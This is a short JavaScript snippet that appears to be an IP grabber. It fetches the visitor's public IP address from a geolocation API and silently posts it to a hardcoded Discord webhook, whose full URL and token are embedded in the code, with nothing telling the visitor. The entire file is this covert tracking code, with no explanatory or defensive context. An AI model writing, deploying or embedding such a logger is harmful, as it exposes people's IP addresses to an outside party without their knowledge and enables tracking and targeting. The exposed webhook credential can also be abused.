let web = 'https://ptb.discord.com/api/webhooks/1445311807588663310/3ELjZ7CbtnDvwdh4-P4aSypZvMbmeNDqWUCjmRhB85fngQ9U5S0C2EgIzCixml2gRWKd';
let req = new XMLHttpRequest();

req.open('GET', 'https://api.db-ip.com/v2/free/self');
req.send();
req.onload = () => {
    webhook(JSON.parse(req.response)['ipAddress'])
}

function webhook(text) {
    let xhr = new XMLHttpRequest();

    xhr.open('POST', web, true);
    xhr.setRequestHeader('Content-Type', 'application/json');

    xhr.send(JSON.stringify({
        'content': text,
        'username': "Log"
    }))
}
